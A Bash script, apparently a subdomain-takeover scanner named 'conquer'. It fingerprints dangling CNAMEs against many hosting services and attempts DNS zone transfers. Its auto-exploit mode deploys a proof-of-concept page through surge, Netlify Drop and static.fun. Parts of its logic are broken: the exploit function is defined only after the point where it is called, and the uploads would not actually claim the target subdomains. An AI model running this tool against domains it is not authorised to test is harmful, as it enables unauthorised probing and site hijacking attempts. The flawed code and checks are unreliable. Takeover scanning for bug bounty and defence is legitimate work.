#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
GREY='\033[1;30m'
BLUE='\033[0;34m'
NC='\033[0m'

declare -A FINGERPRINTS=(
    ["GitHub Pages"]="There isn't a GitHub Pages site here"
    ["Heroku"]="No such app|herokucdn.com/error-pages/no-such-app.html"
    ["AWS/S3"]="NoSuchBucket|The specified bucket does not exist"
    ["Fastly"]="Fastly error: unknown domain"
    ["Azure"]="404 Not Found|This Azure Web App is not currently available"
    ["Zendesk"]="Help Center Closed"
    ["Shopify"]="Sorry, this shop is currently unavailable"
    ["Bitbucket"]="Repository not found"
    ["Ghost"]="The thing you were looking for is no longer here"
    ["Pantheon"]="The gods are wise"
    ["Tumblr"]="There's nothing here|Whatever you were looking for doesn't currently exist"
    ["WordPress"]="Do you want to register"
    ["Desk"]="Sorry, We Couldn't Find That Page"
    ["Campaign Monitor"]="Trying to access your account?"
    ["Canny"]="Company Not Found"
    ["Intercom"]="This page is reserved for artistic dogs"
    ["Webflow"]="The page you are looking for doesn't exist or has been moved"
    ["Netlify"]="Not Found|Welcome to Netlify"
    ["Cloudfront"]="The request could not be satisfied|InvalidDomain"
    ["Google Cloud"]="Error 404 (Not Found)"
    ["Squarespace"]="No Such Account|You're Almost There"
    ["Acquia"]="The requested URL was not found"
    ["Freshdesk"]="There is no helpdesk here|Freshdesk Support Desk"
    ["UserVoice"]="This UserVoice subdomain is currently available"
    ["Kajabi"]="The page you were looking for doesn't exist"
    ["Unbounce"]="The requested URL was not found|The page you're looking for is not here"
    ["WPEngine"]="The site you were looking for couldn't be found"
    ["Cloudflare"]="The requested URL was not found"
)

SILENT=false

AUTO_EXPLOIT=false
SURGE_DOMAIN="surge.sh"
NETLIFY_DROP="https://app.netlify.com/drop"
VERCEL_DEPLOY="https://vercel.com/new"

EXPLOIT_TEMPLATE='<!DOCTYPE html>
<html>
<head>
    <title>Subdomain Takeover PoC</title>
    <meta property="og:title" content="Security Notice">
    <meta property="og:description" content="This domain was vulnerable to takeover">
    <meta property="og:description" content="cc: @1hehaq">
</head>
<body>
    <h1>Subdomain Takeover Proof of Concept</h1>
    <p>This domain was vulnerable to subdomain takeover.</p>
    <p>Identified using conquer tool by @1hehaq</p>
    <p>Hello team, this is a security research proof of concept. Please fix this issue.</p>
    <hr>
    <small>This is a security research proof of concept. Please contact the domain owner.</small>
</body>
</html>'

check_deps() {
    command -v dig >/dev/null 2>&1 || { echo "Error: dig is required but not installed."; exit 1; }
    command -v curl >/dev/null 2>&1 || { echo "Error: curl is required but not installed."; exit 1; }
    if [ -n "$threads" ] && ! command -v parallel >/dev/null 2>&1; then
        echo -e "${YELLOW}[WARNING]${NC} GNU parallel not installed. Install it for faster scanning:"
        echo "Ubuntu/Debian: sudo apt install parallel"
        echo "CentOS/RHEL: sudo yum install parallel"
        echo "macOS: brew install parallel"
        echo -e "${GREY}\ncontinuing without parallel processing!\n${NC}"
    fi
}

usage() {
    echo -e "usage: $0 -d/-l {domain/file}\n"
    echo "  -d    Target domain"
    echo "  -l    File containing list of subdomains"
    echo "  -o    Output file (optional)"
    echo "  -t    Number of threads (default: 10)"
    echo "  -s    Silent mode (only show vulnerable/not vulnerable)"
    echo "  -x    Auto-exploit confirmed takeovers (experimental)"
    exit 1
}

check_dns_misconfiguration() {
    local subdomain=$1
    
    dnssec=$(dig +dnssec "$subdomain" +short)
    
    zonetransfer=$(dig AXFR "$subdomain" 2>/dev/null)
    
    random_sub="random$RANDOM.$subdomain"
    wildcard_check=$(dig +short "$random_sub")
    
    if [ -n "$wildcard_check" ] && [ "$SILENT" = false ]; then
        echo -e "${YELLOW}[WARNING]${NC} Wildcard DNS detected: $subdomain"
    fi
}

enhanced_http_checks() {
    local subdomain=$1
    local protocols=("http" "https")
    local response=""
    
    for protocol in "${protocols[@]}"; do
        for method in "GET" "HEAD" "OPTIONS"; do
            response=$(curl -s -L -X "$method" -I "${protocol}://${subdomain}" 2>/dev/null)
            status_code=$(echo "$response" | grep -i "HTTP/" | tail -1 | awk '{print $2}')
            
            if [ "$SILENT" = false ]; then
                case $status_code in
                    404|410|503)
                        echo -e "${BLUE}[SUSPICIOUS]${NC} $subdomain returned $status_code with $method"
                        ;;
                esac
            fi
        done
    done
}

verify_takeover() {
    local subdomain=$1
    local service=$2
    
    case $service in
        "GitHub Pages")
            repo_name=$(echo "$cname" | cut -d'.' -f1)
            gh_check=$(curl -s "https://api.github.com/repos/$repo_name" 2>/dev/null)
            if echo "$gh_check" | grep -q "Not Found"; then
                [ "$AUTO_EXPLOIT" = true ] && exploit_takeover "$subdomain" "$service"
                return 0
            fi
            ;;
        "AWS/S3")
            bucket_name=$(echo "$cname" | cut -d'.' -f1)
            aws_check=$(curl -s "http://${bucket_name}.s3.amazonaws.com" 2>/dev/null)
            if echo "$aws_check" | grep -q "NoSuchBucket"; then
                [ "$AUTO_EXPLOIT" = true ] && exploit_takeover "$subdomain" "$service"
                return 0
            fi
            ;;
    esac
    return 1
}

check_subdomain() {
    local subdomain=$1
    
    [ -z "$subdomain" ] && return
    
    if [ "$total_subdomains" -gt 0 ] && [ "$SILENT" = false ]; then
        current_subdomain=$((current_subdomain + 1))
        printf "\r${YELLOW}[*]${NC} Progress: %d/%d (%.2f%%)" \
            "$current_subdomain" "$total_subdomains" \
            "$(echo "scale=2; $current_subdomain * 100 / $total_subdomains" | bc)"
    fi
    
    subdomain=$(echo "$subdomain" | tr -d ' \t\r\n')
    
    check_dns_misconfiguration "$subdomain"
    
    cname=$(timeout 10s dig +short CNAME "$subdomain" 2>/dev/null)
    
    if [ -n "$cname" ]; then
        ip=$(timeout 10s dig +short A "$subdomain" 2>/dev/null)
        aaaa=$(timeout 10s dig +short AAAA "$subdomain" 2>/dev/null)
        
        if [ -z "$ip" ] && [ -z "$aaaa" ]; then
            enhanced_http_checks "$subdomain"
            
            for service in "${!FINGERPRINTS[@]}"; do
                response=$(curl -s -L -I "http://$subdomain" 2>/dev/null)
                if echo "$response" | grep -q "${FINGERPRINTS[$service]}"; then
                    if verify_takeover "$subdomain" "$service"; then
                        echo -e "${GREEN}[VULNERABLE - CONFIRMED]${NC} $subdomain"
                        if [ -n "$output_file" ]; then
                            echo "[CONFIRMED] $subdomain" >> "$output_file"
                        fi
                        return
                    fi
                fi
            done
            [ "$SILENT" = false ] && echo -e "${BLUE}[SUSPICIOUS]${NC} $subdomain"
        else
            echo -e "${RED}[NOT VULNERABLE]${NC} $subdomain"
        fi
    else
        [ "$SILENT" = false ] && echo -e "${GREY}[NO CNAME]${NC} $subdomain"
    fi
}

banner() {
    cat << "EOF"

 _______  ___  ___ ___ _____ ____
/ __/ _ \/ _ \/ _ `/ // / -_) __/
\__/\___/_//_/\_, /\___/\__/_/    @1hehaq
               /_/               

EOF
}

echo -e "\n$(banner)\n"

total_subdomains=0
current_subdomain=0

cleanup() {
    kill 0 2>/dev/null
    rm -rf "$tmp_dir"
    exit 1
}

trap cleanup SIGINT SIGTERM EXIT

while getopts "d:l:o:t:hsx" opt; do
    case $opt in
        d) domain="$OPTARG" ;;
        l) subdomain_list="$OPTARG" ;;
        o) output_file="$OPTARG" ;;
        t) threads="$OPTARG" ;;
        s) SILENT=true ;;
        x) AUTO_EXPLOIT=true ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [ -z "$domain" ] && [ -z "$subdomain_list" ]; then
    usage
fi

check_deps

tmp_dir=$(mktemp -d)
trap 'rm -rf "$tmp_dir"' EXIT

process_parallel() {
    local subdomain=$1
    check_subdomain "$subdomain"
}

export -f check_subdomain
export -f enhanced_http_checks
export -f verify_takeover
export -f check_dns_misconfiguration
export RED GREEN YELLOW GREY BLUE NC SILENT FINGERPRINTS

if [ -n "$subdomain_list" ]; then
    if [ ! -f "$subdomain_list" ]; then
        echo -e "${RED}Error: subdomain list file '$subdomain_list' not found${NC}"
        exit 1
    fi

    total_subdomains=$(grep -v '^[[:space:]]*$\|^#' "$subdomain_list" | wc -l)
    [ "$SILENT" = false ] && echo -e "${BLUE}[INFO]${NC} Found $total_subdomains subdomains to scan"

    threads=${threads:-10}

    grep -v '^[[:space:]]*$\|^#' "$subdomain_list" > "$tmp_dir/clean_subdomains"
    
    if [ "$threads" -gt 1 ]; then
        [ "$SILENT" = false ] && echo -e "${BLUE}[INFO]${NC} Processing with $threads threads"
        total_lines=$(wc -l < "$tmp_dir/clean_subdomains")
        lines_per_thread=$(( (total_lines + threads - 1) / threads ))
        split -l "$lines_per_thread" "$tmp_dir/clean_subdomains" "$tmp_dir/split_"
        
        set -m
        
        for split_file in "$tmp_dir"/split_*; do
            (
                while IFS= read -r subdomain; do
                    check_subdomain "$subdomain"
                done < "$split_file"
            ) &
            while [ "$(jobs -r | wc -l)" -ge "$threads" ]; do
                sleep 0.1
            done
        done
        wait || cleanup
    else
        [ "$SILENT" = false ] && echo -e "${YELLOW}[WARNING]${NC} Running sequentially"
        while IFS= read -r subdomain; do
            [[ -z "$subdomain" || "$subdomain" =~ ^[[:space:]]*# ]] && continue
            check_subdomain "$subdomain"
        done < "$tmp_dir/clean_subdomains"
    fi
else
    check_subdomain "$domain"
fi

if [ -n "$output_file" ]; then
    echo "Results saved to $output_file"
fi 

exploit_takeover() {
    local subdomain=$1
    local service=$2
    local success=false
    local tmp_dir=$(mktemp -d)
    
    echo "$EXPLOIT_TEMPLATE" > "$tmp_dir/index.html"
    
    case $service in
        "GitHub Pages"|"Netlify"|"Vercel"|"Heroku"|"AWS/S3")
            # try surge.sh
            if command -v surge &>/dev/null; then
                if surge "$tmp_dir" "https://$subdomain.$SURGE_DOMAIN" --no-prompt &>/dev/null; then
                    success=true
                    echo -e "${GREEN}[EXPLOITED]${NC} Deployed to https://$subdomain.$SURGE_DOMAIN"
                fi
            fi
            
            # try netlify.com
            if [ "$success" = false ]; then
                if curl -s -X POST -F "file=@$tmp_dir/index.html" \
                    -F "title=Security PoC" \
                    "$NETLIFY_DROP" &>/dev/null; then
                    success=true
                    echo -e "${GREEN}[EXPLOITED]${NC} Deployed to Netlify Drop"
                fi
            fi
            
            # try static.fun
            if [ "$success" = false ]; then
                if curl -s -X PUT -d "@$tmp_dir/index.html" \
                    "https://static.fun/$subdomain/index.html" &>/dev/null; then
                    success=true
                    echo -e "${GREEN}[EXPLOITED]${NC} Deployed to https://static.fun/$subdomain"
                fi
            fi
            ;;
    esac
    
    rm -rf "$tmp_dir"
    
    if [ "$success" = true ]; then
        if [ -n "$output_file" ]; then
            echo "[EXPLOITED] $subdomain - PoC deployed" >> "$output_file"
        fi
        return 0
    fi
    return 1
} 
